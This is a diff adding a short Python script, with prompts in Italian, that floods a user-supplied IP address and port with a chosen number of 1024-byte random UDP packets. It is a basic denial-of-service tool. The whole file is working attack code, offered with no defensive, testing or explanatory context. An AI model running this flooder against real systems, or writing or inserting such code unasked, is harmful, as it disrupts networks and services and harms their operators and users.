@@ -1,0 +1,17 @@
+import socket
+import random
+
+def udp_flood(target_ip, target_port, packet_count):
+    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    packet_data = bytes(random.randint(0, 255) for _ in range(1024))
+
+    for _ in range(packet_count):
+        udp_socket.sendto(packet_data, (target_ip, target_port))
+
+    udp_socket.close()
+
+target_ip = input("Inserisci l'IP target: ")
+target_port = int(input("Inserisci la porta target: "))
+packet_count = int(input("Inserisci il numero di pacchetti da inviare: "))
+
+udp_flood(target_ip, target_port, packet_count)
